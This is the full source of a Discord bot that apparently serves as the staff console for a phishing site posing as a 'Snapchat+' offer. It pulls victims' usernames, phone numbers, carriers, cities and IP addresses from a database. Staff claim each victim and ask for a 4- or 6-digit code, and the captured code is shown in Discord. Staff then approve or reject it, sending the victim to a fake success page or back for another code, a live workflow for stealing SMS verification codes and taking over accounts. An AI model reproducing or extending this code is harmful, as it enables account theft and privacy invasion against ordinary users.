import 'dotenv/config';
import { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder, REST, Routes } from 'discord.js';
import { neon } from '@neondatabase/serverless';

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const GUILD_ID = process.env.DISCORD_GUILD_ID;
const LOG_CHANNEL_ID = process.env.DISCORD_LOG_CHANNEL_ID;
const DATABASE_URL = process.env.DATABASE_URL;
const STAFF_SECRET = process.env.STAFF_SECRET;
const API_BASE = process.env.API_BASE || 'https://snaptech.vercel.app';

if (!TOKEN || !CLIENT_ID || !DATABASE_URL) {
    console.error('❌ Missing variables: DISCORD_BOT_TOKEN, DISCORD_CLIENT_ID, DATABASE_URL');
    process.exit(1);
}

const sql = neon(DATABASE_URL);
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// ─── OPERATOR COLORS ───
const OPERATOR_COLORS = {
    'sfr': 0xe2001a,
    'orange': 0xff6600,
    'bouygues': 0x0099cc,
    'base': 0x00a4e0,
    'orange_be': 0xff6600,
    'proximus': 0x5c2d91,
    'telenet': 0xe2001a
};

const DEFAULT_COLOR = 0xfffc00;

function getOperatorColor(operator) {
    return OPERATOR_COLORS[operator?.toLowerCase()] || DEFAULT_COLOR;
}

// ─── SLASH COMMANDS ───
const commands = [
    new SlashCommandBuilder().setName('config').setDescription('Set the log channel')
        .addChannelOption(opt => opt.setName('channel').setDescription('Discord channel').setRequired(true)),
    new SlashCommandBuilder().setName('panel').setDescription('Show the staff panel'),
    new SlashCommandBuilder().setName('claim').setDescription('Claim a request')
        .addStringOption(opt => opt.setName('phone').setDescription('Phone number').setRequired(true)),
    new SlashCommandBuilder().setName('setlength').setDescription('Set code length')
        .addStringOption(opt => opt.setName('phone').setDescription('Phone number').setRequired(true))
        .addIntegerOption(opt => opt.setName('length').setDescription('4 or 6').setRequired(true)),
    new SlashCommandBuilder().setName('wrongnumber').setDescription('Mark as wrong number')
        .addStringOption(opt => opt.setName('phone').setDescription('Phone number').setRequired(true)),
    new SlashCommandBuilder().setName('banip').setDescription('Ban an IP address')
        .addStringOption(opt => opt.setName('ip').setDescription('IP address').setRequired(true))
];

const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
    try {
        console.log('🔄 Deploying slash commands...');
        await rest.put(
            GUILD_ID ? Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID) : Routes.applicationCommands(CLIENT_ID),
            { body: commands.map(c => c.toJSON()) }
        );
        console.log('✅ Slash commands deployed');
    } catch (e) {
        console.error('Deploy error:', e);
    }
})();

// ─── READY ───
client.once('ready', () => {
    console.log(`🤖 Bot connected as ${client.user.tag}`);
    console.log(`📡 API: ${API_BASE}`);
    console.log(`📝 Log channel: ${LOG_CHANNEL_ID || 'Not set — use /config'}`);
    startPollingPending();
    startPollingCodeSubmitted();
});

// ─── POLLING 1: new PENDING requests ───
let lastPendingId = 0;

async function startPollingPending() {
    setInterval(async () => {
        try {
            const rows = await sql`
                SELECT id, username, phone, operator, country, city, ip_address, status, created_at
                FROM snap_requests
                WHERE id > ${lastPendingId} AND status = 'pending'
                ORDER BY id ASC
            `;
            for (const row of rows) {
                lastPendingId = Math.max(lastPendingId, row.id);
                await sendNewRequestEmbed(row);
            }
        } catch (e) {
            console.error('Pending polling error:', e.message || e);
        }
    }, 5000);
}

// ─── POLLING 2: CODE_SUBMITTED requests ───
let lastCodeSubmittedId = 0;

async function startPollingCodeSubmitted() {
    setInterval(async () => {
        try {
            const rows = await sql`
                SELECT id, username, phone, operator, country, city, ip_address, staff_code, code_length, status, created_at
                FROM snap_requests
                WHERE id > ${lastCodeSubmittedId} AND status = 'code_submitted' AND staff_code IS NOT NULL
                ORDER BY id ASC
            `;
            for (const row of rows) {
                lastCodeSubmittedId = Math.max(lastCodeSubmittedId, row.id);
                await sendCodeSubmittedEmbed(row);
            }
        } catch (e) {
            console.error('CodeSubmitted polling error:', e.message || e);
        }
    }, 5000);
}

// ─── Helpers ───
const carrierNames = {
    'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
    'base': 'BASE', 'orange_be': 'Orange Belgium', 'proximus': 'Proximus', 'telenet': 'Telenet'
};

function formatPhone(phone) { return '``' + phone + '``'; }
function formatIP(ip) { return ip && ip !== 'unknown' ? '``' + ip + '``' : '`unknown`'; }

function createBanIPButton(ip) {
    if (!ip || ip === 'unknown' || ip === 'null' || !ip.includes('.')) return null;
    return new ButtonBuilder()
        .setCustomId('banip_' + ip)
        .setLabel('🚫 Ban IP')
        .setStyle(ButtonStyle.Danger);
}

// ─── Embed: NEW REQUEST ───
async function sendNewRequestEmbed(row) {
    const channel = client.channels.cache.get(LOG_CHANNEL_ID);
    if (!channel) { console.log('⚠️ Log channel not found'); return; }

    const color = getOperatorColor(row.operator);
    const carrier = carrierNames[row.operator] || row.operator;
    const ip = row.ip_address;

    const embed = new EmbedBuilder()
        .setTitle('📱 New Snapchat+ Request')
        .setColor(color)
        .setDescription('**Operator:** ' + carrier + '  |  **Country:** ' + (row.country || 'Unknown'))
        .addFields(
            { name: '👤 Username', value: '``' + row.username + '``', inline: true },
            { name: '📞 Phone', value: formatPhone(row.phone), inline: true },
            { name: '📡 Operator', value: '``' + carrier + '``', inline: true },
            { name: '🌍 Country', value: '``' + (row.country || 'Unknown') + '``', inline: true },
            { name: '🏙️ City', value: '``' + (row.city || 'Unknown') + '``', inline: true },
            { name: '🌐 IP', value: formatIP(ip), inline: true },
            { name: '⏰ Date', value: '<t:' + Math.floor(new Date(row.created_at).getTime()/1000) + ':R>', inline: false }
        )
        .setFooter({ text: 'ID: ' + row.id + '  •  Waiting for staff' })
        .setTimestamp();

    const buttons = [
        new ButtonBuilder().setCustomId('claim_' + row.phone).setLabel('📋 Claim').setStyle(ButtonStyle.Primary)
    ];

    const banBtn = createBanIPButton(ip);
    if (banBtn) buttons.push(banBtn);

    const rowButtons = new ActionRowBuilder().addComponents(...buttons);
    await channel.send({ embeds: [embed], components: [rowButtons] });
    console.log('📨 New request: ' + row.phone + ' (' + carrier + ')');
}

// ─── Embed: CODE SUBMITTED ───
async function sendCodeSubmittedEmbed(row) {
    const channel = client.channels.cache.get(LOG_CHANNEL_ID);
    if (!channel) return;

    const color = getOperatorColor(row.operator);
    const carrier = carrierNames[row.operator] || row.operator;
    const code = row.staff_code || 'N/A';
    const len = row.code_length || 6;
    const ip = row.ip_address;

    const embed = new EmbedBuilder()
        .setTitle('🔓 Code Submitted by User')
        .setColor(color)
        .setDescription('The user entered a **' + len + '-digit** code. Please verify below.')
        .addFields(
            { name: '👤 Username', value: '``' + row.username + '``', inline: true },
            { name: '📞 Phone', value: formatPhone(row.phone), inline: true },
            { name: '🔢 Entered Code', value: '```\n' + code + '\n```', inline: false },
            { name: '📡 Operator', value: '``' + carrier + '``', inline: true },
            { name: '🌍 Country', value: '``' + (row.country || 'Unknown') + '``', inline: true },
            { name: '🏙️ City', value: '``' + (row.city || 'Unknown') + '``', inline: true },
            { name: '🌐 IP', value: formatIP(ip), inline: true }
        )
        .setFooter({ text: 'ID: ' + row.id + '  •  Awaiting staff validation' })
        .setTimestamp();

    const buttons = [
        new ButtonBuilder().setCustomId('truecode_' + row.phone).setLabel('✅ True Code').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('falsecode_' + row.phone).setLabel('❌ False Code').setStyle(ButtonStyle.Danger)
    ];

    const banBtn = createBanIPButton(ip);
    if (banBtn) buttons.push(banBtn);

    const actionRow = new ActionRowBuilder().addComponents(...buttons);
    await channel.send({ embeds: [embed], components: [actionRow] });
    console.log('🔓 Code submitted: ' + row.phone + ' — Code: ' + code);
}

// ─── Embed: RETRY REQUEST (when false code) ───
async function sendRetryEmbed(row, staffUserId) {
    const channel = client.channels.cache.get(LOG_CHANNEL_ID);
    if (!channel) return;

    const color = getOperatorColor(row.operator);
    const carrier = carrierNames[row.operator] || row.operator;
    const ip = row.ip_address;

    const embed = new EmbedBuilder()
        .setTitle('🔄 User Redirected — New Code Needed')
        .setColor(color)
        .setDescription('The previous code was **incorrect**. The user has been redirected to enter a new code.')
        .addFields(
            { name: '👤 Username', value: '``' + row.username + '``', inline: true },
            { name: '📞 Phone', value: formatPhone(row.phone), inline: true },
            { name: '📡 Operator', value: '``' + carrier + '``', inline: true },
            { name: '🌍 Country', value: '``' + (row.country || 'Unknown') + '``', inline: true },
            { name: '🏙️ City', value: '``' + (row.city || 'Unknown') + '``', inline: true },
            { name: '🌐 IP', value: formatIP(ip), inline: true }
        )
        .setFooter({ text: 'ID: ' + row.id + '  •  Choose an action below' })
        .setTimestamp();

    const buttons = [
        new ButtonBuilder().setCustomId('len4_' + row.phone).setLabel('🔢 4 digits').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('len6_' + row.phone).setLabel('🔢 6 digits').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId('wrong_' + row.phone).setLabel('❌ Wrong Number').setStyle(ButtonStyle.Danger)
    ];

    const banBtn = createBanIPButton(ip);
    if (banBtn) buttons.push(banBtn);

    const actionRow = new ActionRowBuilder().addComponents(...buttons);
    const msg = await channel.send({ embeds: [embed], components: [actionRow] });
    console.log('🔄 Retry embed sent: ' + row.phone);
    return msg;
}

// ─── INTERACTIONS ───
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const parts = interaction.customId.split('_');
    const action = parts[0];
    const payload = parts.slice(1).join('_');

    // ─── CLAIM ───
    if (action === 'claim') {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'claim', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();

            if (data.success) {
                await interaction.editReply({ content: '✅ Request **' + formatPhone(phone) + '** claimed by <@' + interaction.user.id + '>' });

                const rows = await sql`SELECT operator, ip_address FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
                const op = rows[0]?.operator;
                const ip = rows[0]?.ip_address;
                const color = getOperatorColor(op);

                const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(color)
                    .setTitle('📋 Request In Progress')
                    .setDescription('👤 Claimed by <@' + interaction.user.id + '>\n\n**Choose an action:**');

                const buttons = [
                    new ButtonBuilder().setCustomId('len4_' + phone).setLabel('🔢 4 digits').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('len6_' + phone).setLabel('🔢 6 digits').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('wrong_' + phone).setLabel('❌ Wrong Number').setStyle(ButtonStyle.Danger)
                ];

                const banBtn = createBanIPButton(ip);
                if (banBtn) buttons.push(banBtn);

                const actionRow = new ActionRowBuilder().addComponents(...buttons);
                await interaction.message.edit({ embeds: [newEmbed], components: [actionRow] });
            } else {
                await interaction.editReply({ content: '❌ ' + data.message });
            }
        } catch (e) {
            await interaction.editReply({ content: '❌ Network error' });
        }
    }

    // ─── 4 DIGITS ───
    if (action === 'len4') {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'set_length', phone, length: 4, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ 4-digit code requested for ' + formatPhone(phone) : '❌ ' + data.message });
            if (data.success) {
                const rows = await sql`SELECT operator FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
                const color = getOperatorColor(rows[0]?.operator);
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(color)
                    .setTitle('⏳ Waiting for Code (4 digits)')
                    .setDescription('👤 Claimed\n🔢 Code requested: **4 digits**');
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
    }

    // ─── 6 DIGITS ───
    if (action === 'len6') {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'set_length', phone, length: 6, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ 6-digit code requested for ' + formatPhone(phone) : '❌ ' + data.message });
            if (data.success) {
                const rows = await sql`SELECT operator FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
                const color = getOperatorColor(rows[0]?.operator);
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(color)
                    .setTitle('⏳ Waiting for Code (6 digits)')
                    .setDescription('👤 Claimed\n🔢 Code requested: **6 digits**');
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
    }

    // ─── WRONG NUMBER ───
    if (action === 'wrong') {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'wrong_number', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ Wrong number reported for ' + formatPhone(phone) : '❌ ' + data.message });
            if (data.success) {
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0xef4444)
                    .setTitle('❌ Wrong Number')
                    .setDescription('❌ User has been redirected to re-enter their phone number.');
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
    }

    // ─── TRUE CODE ───
    if (action === 'truecode') {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'true_code', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ Code validated for ' + formatPhone(phone) : '❌ ' + data.message });
            if (data.success) {
                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0x10b981)
                    .setTitle('✅ Code Validated')
                    .setDescription('👤 Validated by <@' + interaction.user.id + '>\nThe user is being redirected to the congratulations page.');
                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
            }
        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
    }

    // ─── FALSE CODE ───
    if (action === 'falsecode') {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'false_code', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '❌ Code refused for ' + formatPhone(phone) + '. User must re-enter.' : '❌ ' + data.message });

            if (data.success) {
                // Update original embed to "refused"
                const refusedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0xef4444)
                    .setTitle('❌ Code Refused')
                    .setDescription('👤 Refused by <@' + interaction.user.id + '>\nThe user has been redirected to enter a new code.');
                await interaction.message.edit({ embeds: [refusedEmbed], components: [] });

                // ─── NOUVEAU : Envoyer un embed Discord pour la retry ───
                const rows = await sql`SELECT id, username, phone, operator, country, city, ip_address, code_length FROM snap_requests WHERE phone = ${phone} LIMIT 1`;
                if (rows.length > 0) {
                    await sendRetryEmbed(rows[0], interaction.user.id);
                }
            }
        } catch (e) { 
            console.error('False code error:', e);
            await interaction.editReply({ content: '❌ Error' }); 
        }
    }

    // ─── BAN IP ───
    if (action === 'banip') {
        await interaction.deferReply({ flags: 64 });
        const ip = payload;
        if (!ip || ip === 'unknown' || ip === 'null') {
            await interaction.editReply({ content: '❌ Cannot ban: invalid IP address' });
            return;
        }
        try {
            const res = await fetch(API_BASE + '/api/ban-ip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip, secret: STAFF_SECRET, banned_by: interaction.user.tag })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '🚫 IP **' + ip + '** banned successfully!' : '❌ ' + data.message });
            if (data.success) {
                const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                    .setColor(0xef4444)
                    .setTitle('🔨 IP Banned')
                    .setDescription('🚫 IP **' + ip + '** banned by <@' + interaction.user.id + '>');
                await interaction.message.edit({ embeds: [bannedEmbed], components: [] });
            }
        } catch (e) {
            console.error('Ban IP error:', e);
            await interaction.editReply({ content: '❌ Network error while banning IP' });
        }
    }
});

// ─── SLASH COMMANDS ───
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'config') {
        const channel = interaction.options.getChannel('channel');
        process.env.DISCORD_LOG_CHANNEL_ID = channel.id;
        await interaction.reply({ content: '✅ Log channel set to <#' + channel.id + '>', flags: 64 });
    }

    if (interaction.commandName === 'panel') {
        const embed = new EmbedBuilder()
            .setTitle('🎛️ Staff Panel')
            .setDescription('Requests will appear here automatically.\n\n**Embed Colors:**')
            .addFields(
                { name: '🔴 Red', value: 'SFR / Telenet', inline: true },
                { name: '🟠 Orange', value: 'Orange / Orange Belgium', inline: true },
                { name: '🔵 Blue', value: 'Bouygues / BASE', inline: true },
                { name: '🟣 Purple', value: 'Proximus', inline: true },
                { name: '🟡 Yellow', value: 'Other operator', inline: true }
            )
            .setColor(0x000000);
        await interaction.reply({ embeds: [embed] });
    }

    if (interaction.commandName === 'claim') {
        const phone = interaction.options.getString('phone');
        await interaction.deferReply();
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'claim', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ ' + data.message : '❌ ' + data.message });
        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
    }

    if (interaction.commandName === 'setlength') {
        const phone = interaction.options.getString('phone');
        const length = interaction.options.getInteger('length');
        await interaction.deferReply();
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'set_length', phone, length, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ ' + data.message : '❌ ' + data.message });
        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
    }

    if (interaction.commandName === 'wrongnumber') {
        const phone = interaction.options.getString('phone');
        await interaction.deferReply();
        try {
            const res = await fetch(API_BASE + '/api/staff-action', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'wrong_number', phone, secret: STAFF_SECRET })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '✅ ' + data.message : '❌ ' + data.message });
        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
    }

    if (interaction.commandName === 'banip') {
        const ip = interaction.options.getString('ip');
        await interaction.deferReply();
        try {
            const res = await fetch(API_BASE + '/api/ban-ip', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip, secret: STAFF_SECRET, banned_by: interaction.user.tag })
            });
            const data = await res.json();
            await interaction.editReply({ content: data.success ? '🚫 ' + data.message : '❌ ' + data.message });
        } catch (e) { await interaction.editReply({ content: '❌ Error' }); }
    }
});

client.login(TOKEN);
